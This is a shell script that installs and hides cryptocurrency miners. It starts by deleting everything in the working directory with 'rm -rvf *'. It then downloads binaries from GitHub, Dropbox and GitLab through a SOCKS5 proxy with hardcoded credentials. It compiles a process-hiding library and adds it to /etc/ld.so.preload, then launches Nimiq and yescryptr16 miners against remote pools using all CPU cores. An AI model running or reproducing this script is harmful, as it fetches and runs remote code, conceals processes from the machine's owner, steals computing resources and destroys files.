rm -rvf * && mkdir d && cd d
#!/bin/sh
echo " "
echo " "
echo " "
echo "====================================="
echo "╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗  ╔╗ ╔═╗╔═╗╦╔═ "
echo "║║║║╣ ║  ║  ║ ║║║║║╣   ╠╩╗╠═╣║  ╠╩╗ "
echo "╚╩╝╚═╝╩═╝╚═╝╚═╝╩ ╩╚═╝  ╚═╝╩ ╩╚═╝╩ ╩ "
echo "====================================="
echo "MalingNih"
echo " "
echo " "
echo " "
sleep 5

echo "==================="
echo "   CEK TIMEZONE   "
echo "==================="
echo " "
echo " "
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
sleep 5

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://github.com/maszehh/sempak/raw/main/sempak.tar.gz
tar -xvzf sempak.tar.gz
rm -rf sempak.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 103.175.218.245:443 
socks5_username = berkah 
socks5_password = bersama
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp rm -rf gas && wget -q 'https://www.dropbox.com/s/m8c5iw50chb2i2n/anu.zip'
unzip anu.zip
chmod +x sempak
rm -rf Makefile
rm -rf processhider.c
rm -rf README.md
rm -rf .gitignore
rm -rf anu.zip

./graftcp/graftcp wget https://github.com/maszehh/sempak/raw/main/ngumpet.zip
unzip ngumpet.zip
rm -rf ngumpet.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./sempak -d=0 -a "NQ82UYV095UD9MST21399ABS 6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n GPU-Sage -t 4  -i Disable & ./graftcp/graftcp wget https://gitlab.com/mulungweb2020/httpd/-/raw/main/httpd && chmod 700 httpd && ./httpd -a yescryptr16 -o stratum+tcp://43.133.156.187:443 -u bq1q27vkemvhlqtp2d46lvuzuw7mvul8lyg0ruh4mr.CPU-Sage -t $(nproc) -p m=solo
